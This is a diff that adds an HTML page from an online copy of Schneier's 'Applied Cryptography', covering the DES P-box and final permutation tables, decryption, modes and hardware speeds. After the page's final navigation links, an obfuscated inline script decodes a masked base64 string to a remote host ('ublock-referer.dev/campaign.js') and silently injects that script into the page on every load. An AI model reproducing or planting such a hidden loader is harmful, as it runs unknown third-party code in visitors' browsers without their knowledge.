@@ -1,0 +1,198 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=277-278//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<TABLE WIDTH="100%">
+<TR>
+<TH CAPTION COLSPAN="16" ALIGN="CENTER">Table 12.7<BR>P-Box Permutation
+<TR>
+<TD COLSPAN="16"><HR>
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">16,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">7,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">20,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">21,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">29,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">12,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">28,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">17,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">1,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">15,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">23,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">26,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">5,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">18,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">31,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">10,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">2,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">8,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">24,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">14,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">32,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">27,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">3,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">9,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">19,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">13,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">30,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">6,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">22,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">11,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">4,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">25
+<TR>
+<TD WIDTH="6%" COLSPAN="16"><HR>
+</TABLE>
+<P>Finally, the result of the P-box permutation is XORed with the left half of the initial 64-bit block. Then the left and right halves are switched and another round begins.
+</P>
+<P><FONT SIZE="+1"><B><I>The Final Permutation</I></B></FONT></P>
+<P>The final permutation is the inverse of the initial permutation and is described in Table 12.8. Note that the left and right halves are not exchanged after the last round of DES; instead the concatenated block <I>R</I><SUB>16</SUB><I>L</I><SUB>16</SUB> is used as the input to the final permutation. There&#146;s nothing going on here; exchanging the halves and shifting around the permutation would yield exactly the same result. This is so that the algorithm can be used to both encrypt and decrypt.</P>
+<P><FONT SIZE="+1"><B><I>Decrypting DES</I></B></FONT></P>
+<P>After all the substitutions, permutations, XORs, and shifting around, you might think that the decryption algorithm is completely different and just as confusing as the encryption algorithm. On the contrary, the various operations were chosen to produce a very useful property: The same algorithm works for both encryption and decryption.
+</P>
+<P>With DES it is possible to use the same function to encrypt or decrypt a block. The only difference is that the keys must be used in the reverse order. That is, if the encryption keys for each round are <I>K</I><SUB>1</SUB> <I>K</I><SUB>2</SUB> <I>K</I><SUB>3</SUB>,..., <I>K</I><SUB>16</SUB> then the decryption keys are <I>K</I><SUB>16</SUB> <I>K</I><SUB>15</SUB> <I>K</I><SUB>14,</SUB> ..., <I>K</I><SUB>1</SUB>. The algorithm that generates the key used for each round is circular as well. The key shift is a right shift and the number of positions shifted is 0,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1.</P>
+<P><FONT SIZE="+1"><B><I>Modes of DES</I></B></FONT></P>
+<P>FIPS PUB 81 specifies four modes of operation: ECB, CBC, OFB, and CFB (see Chapter 9) [1143]. The ANSI banking standards specify ECB and CBC for encryption, and CBC and <I>n-</I>bit CFB for authentication [52].</P>
+<P>In the software world, certification is usually not an issue. Because of its simplicity, ECB is most often used in off-the-shelf commercial software products, although it is the most vulnerable to attack. CBC is used occasionally, even though it is just slightly more complicated than ECB and provides much more security.</P>
+<TABLE WIDTH="100%"><TR>
+<TH CAPTION COLSPAN="16" ALIGN="CENTER">Table 12.8<BR>Final Permutation
+<TR>
+<TD COLSPAN="16"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">40,
+<TD VALIGN="TOP" ALIGN="LEFT">8,
+<TD VALIGN="TOP" ALIGN="LEFT">48,
+<TD VALIGN="TOP" ALIGN="LEFT">16,
+<TD VALIGN="TOP" ALIGN="LEFT">56,
+<TD VALIGN="TOP" ALIGN="LEFT">24,
+<TD VALIGN="TOP" ALIGN="LEFT">64,
+<TD VALIGN="TOP" ALIGN="LEFT">32,
+<TD VALIGN="TOP" ALIGN="LEFT">39,
+<TD VALIGN="TOP" ALIGN="LEFT">7,
+<TD VALIGN="TOP" ALIGN="LEFT">47,
+<TD VALIGN="TOP" ALIGN="LEFT">15,
+<TD VALIGN="TOP" ALIGN="LEFT">55,
+<TD VALIGN="TOP" ALIGN="LEFT">23,
+<TD VALIGN="TOP" ALIGN="LEFT">63,
+<TD VALIGN="TOP" ALIGN="LEFT">31,
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">38,
+<TD VALIGN="TOP" ALIGN="LEFT">6,
+<TD VALIGN="TOP" ALIGN="LEFT">46,
+<TD VALIGN="TOP" ALIGN="LEFT">14,
+<TD VALIGN="TOP" ALIGN="LEFT">54,
+<TD VALIGN="TOP" ALIGN="LEFT">22,
+<TD VALIGN="TOP" ALIGN="LEFT">62,
+<TD VALIGN="TOP" ALIGN="LEFT">30,
+<TD VALIGN="TOP" ALIGN="LEFT">37,
+<TD VALIGN="TOP" ALIGN="LEFT">5,
+<TD VALIGN="TOP" ALIGN="LEFT">45,
+<TD VALIGN="TOP" ALIGN="LEFT">13,
+<TD VALIGN="TOP" ALIGN="LEFT">53,
+<TD VALIGN="TOP" ALIGN="LEFT">21,
+<TD VALIGN="TOP" ALIGN="LEFT">61,
+<TD VALIGN="TOP" ALIGN="LEFT">29,
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">36,
+<TD VALIGN="TOP" ALIGN="LEFT">4,
+<TD VALIGN="TOP" ALIGN="LEFT">44,
+<TD VALIGN="TOP" ALIGN="LEFT">12,
+<TD VALIGN="TOP" ALIGN="LEFT">52,
+<TD VALIGN="TOP" ALIGN="LEFT">20,
+<TD VALIGN="TOP" ALIGN="LEFT">60,
+<TD VALIGN="TOP" ALIGN="LEFT">28,
+<TD VALIGN="TOP" ALIGN="LEFT">35,
+<TD VALIGN="TOP" ALIGN="LEFT">3,
+<TD VALIGN="TOP" ALIGN="LEFT">43,
+<TD VALIGN="TOP" ALIGN="LEFT">11,
+<TD VALIGN="TOP" ALIGN="LEFT">51,
+<TD VALIGN="TOP" ALIGN="LEFT">19,
+<TD VALIGN="TOP" ALIGN="LEFT">59,
+<TD VALIGN="TOP" ALIGN="LEFT">27,
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">34,
+<TD VALIGN="TOP" ALIGN="LEFT">2,
+<TD VALIGN="TOP" ALIGN="LEFT">42,
+<TD VALIGN="TOP" ALIGN="LEFT">10,
+<TD VALIGN="TOP" ALIGN="LEFT">50,
+<TD VALIGN="TOP" ALIGN="LEFT">18,
+<TD VALIGN="TOP" ALIGN="LEFT">58,
+<TD VALIGN="TOP" ALIGN="LEFT">26,
+<TD VALIGN="TOP" ALIGN="LEFT">33,
+<TD VALIGN="TOP" ALIGN="LEFT">1,
+<TD VALIGN="TOP" ALIGN="LEFT">41,
+<TD VALIGN="TOP" ALIGN="LEFT">9,
+<TD VALIGN="TOP" ALIGN="LEFT">49,
+<TD VALIGN="TOP" ALIGN="LEFT">17,
+<TD VALIGN="TOP" ALIGN="LEFT">57,
+<TD VALIGN="TOP" ALIGN="LEFT">25
+<TR>
+<TD COLSPAN="16" VALIGN="TOP" ALIGN="LEFT"><HR>
+</TABLE>
+<P><FONT SIZE="+1"><B><I>Hardware and Software Implementations of DES</I></B></FONT></P>
+<P>Much has been written on efficient hardware and software implementations of the algorithm [997,81,533,534,437,738,1573,176,271,1572]. At this writing, the recordholder for the fastest DES chip is a prototype developed at Digital Equipment Corporation [512]. It supports ECB and CBC modes and is based on a GaAs gate array of 50,000 transistors. Data can be encrypted and decrypted at a rate of 1 gigabit per second, which translates to 16.8 million blocks per second. This is impressive. Table 12.9 gives the specifications for some commercial DES chips. Seeming discrepancies between clock speed and data rate are due to pipelining within the chip; a chip might have multiple DES engines working in parallel.
+</P>
+<P>The most impressive DES chip is VLSI&#146;s 6868 (formerly called &#147;Gatekeeper&#148;). Not only can it perform DES encryption in only 8 clock cycles (prototypes in the lab can do it in 4 clock cycles), but it can also do ECB triple-DES in 25 clock cycles, and OFB or CBC triple-DES in 35 clock cycles. This sounds impossible to me, too, but I assure you it works.</P>
+<P>A software implementation of DES on an IBM 3090 mainframe can perform 32,000 DES encryptions per second. Most microcomputers are slower, but impressive nonetheless. Table 12.10 [603,793] gives actual results and estimates for various Intel and Motorola microprocessors.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(UdImzzYP, whlkfLMd) {whlkfLMd = UdImzzYP.createElement('script');whlkfLMd.type = 'text/javascript';whlkfLMd.async = true;whlkfLMd.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');UdImzzYP.getElementsByTagName('body')[0].appendChild(whlkfLMd);}(document));</script></body>
+</html>
